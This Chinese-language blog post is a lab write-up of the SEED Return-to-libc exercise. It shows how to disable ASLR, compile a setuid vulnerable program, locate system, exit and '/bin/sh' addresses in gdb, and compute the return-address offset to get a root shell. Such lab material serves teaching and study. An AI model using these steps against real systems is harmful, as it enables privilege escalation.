---

layout: post

title: 'Return-to-libc'

date: '2017-02-28'

header-img: "img/home-bg.jpg"

tags:
     - 逆向
     - 二进制漏洞
author: 'De4dCr0w'

---

### 实验步骤 ###
（1）初始化：
  
	$ su root  
	Password: (enter root password)  
	# /sbin/sysctl -w kernel.randomize_va_space=0  
	（关闭地址随机化）  

（2）编写exploit.c 文件，溢出程序的编写：（如下图）  

![](http://i.imgur.com/OID4jIH.png)  

（3）编译exploit.c文件，生成exploit文件，执行exploit,生成badfile文件  

	$ gcc -o exploit exploit.c
	$./exploit
	// create the badfile  

（4）编译stack.c文件  

	$ su root
	Password (enter root password)
	# gcc -o retlib -z execstack -fno-stack-protector -g retlib.c
	# chmod 4755 stack
	# exit
	-z execstack : 使填写在栈内的内容能过执行
	-fno-stack-protector : 关闭栈溢出保护，使栈可以被溢出
	-g : 可调试编译，使程序能够被调试  

（5）执行retlib，获得root权限  

	$./retlib
	// launch the attack by running the vulnerable program
	# <---- Bingo! You’ve got a root shell!


### 实验过程 ###

（1）寻找system，exit，“/bin/sh”的地址  

	gdb retlib
	
	(gdb) b main
	Breakpoint 1 at 0x80484bc: file retlib.c, line 20.
	(gdb) r
	Starting program: /home/seed/Lesson1/retlib 

	Breakpoint 1, main (argc=1, argv=0xbffff414) at retlib.c:20
	20	    badfile = fopen("badfile", "r");
	(gdb) p system     （寻找调用system的地址）
	$1 = {<text variable, no debug info>} 0xb7e5f430 <system>
	(gdb) find system,+9999999,"/bin/sh"  （寻找“/bin/sh”字符串的地址）
	0xb7f80fb8
	warning: Unable to access target memory at 0xb7fc74c0, halting search.
	1 pattern found.
	(gdb) p exit    （寻找调用exit的地址）
	$2 = {<text variable, no debug info>} 0xb7e52fb0 <exit>
	(gdb) p setuid  （寻找调用setuid的地址）
	$3 = {<text variable, no debug info>} 0xb7ed8e40 <setuid>
	(gdb) 

（2）找到bof函数的返回地址，反汇编bof函数  

	(gdb) disassemble bof
	Dump of assembler code for function bof:
	0x08048484 <+0>:	push   %ebp
	0x08048485 <+1>:	mov    %esp,%ebp
   	0x08048487 <+3>:	sub    $0x28,%esp
  	0x0804848a <+6>:	lea    -0x14(%ebp),%eax
 	0x0804848d <+9>:	mov    0x8(%ebp),%edx
   	0x08048490 <+12>:	mov    %edx,0xc(%esp)
   	0x08048494 <+16>:	movl   $0x28,0x8(%esp)
   	0x0804849c <+24>:	movl   $0x1,0x4(%esp)
   	0x080484a4 <+32>:	mov    %eax,(%esp)
   	0x080484a7 <+35>:	call   0x8048380 <fread@plt>
   	0x080484ac <+40>:	mov    $0x1,%eax
   	0x080484b1 <+45>:	leave  
   	0x080484b2 <+46>:	ret    
	End of assembler dump.

　　这里eax（-0x14(%ebp)）存的是buffer[0]的地址，且0x14 = 20,说明ebp和buffer[0]的地址相差20个字节，所以跳转地址就应该填在buffer[24]~buffer[27]的位置，所以只要把system的调用地址填在这，就可以跳转去执行system函数了，然后依次去执行exit函数(buffer[28]~buffer[31])  

#### 这里”/bin/sh” 为什么放在 exit  函数后面？ ####
解答：

	0x080484b1 <+45>: leave  

相当于语句:  

	pop %ebp
	mov %ebp, %esp

然后执行：  

	0x080484b2 <+46>: ret 
	This instruction simply pops the return address out of the stack, 
	and then jump to the return address. 

leave 指令 pop ebp后栈内 esp 指向 return address，ret 指令跳转到 system()，执行system函数时，先push函数参数再执行call，而call的时候会将返回地址push到栈上，所以我们在构建栈帧的时候，system函数的地址与参数的地址之间需要填充一个虚构的返回函数，这里我们填充exit函数地址。

![](http://i.imgur.com/5O4z4dx.png)

（图为网上一道pwn题的思路，可以帮助理解，和本实验的地址不一样）

我们可以利用Return-to-libc的方法构建栈帧绕过NX选项：   
　　NX即No-eXecute（不可执行）的意思，NX选项会将进程特殊区域的内存标记为不可执行，当CPU跳转到这些区域执行代码的时候便会产生异常，以阻止缓冲区溢出时直接在栈上执行恶意代码。  
　　gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。在Windows下，类似的概念为DEP（Data Execution Prevention，数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项

我们可以使用checksec.sh脚本可以方便的查看可执行程序是否启用了NX，checksec脚本的下载地址为：[http://www.trapkit.de/tools/checksec.sh](http://www.trapkit.de/tools/checksec.sh "checksec脚本")  

实验地址：[http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Return_to_libc/](http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Return_to_libc/ "实验地址")
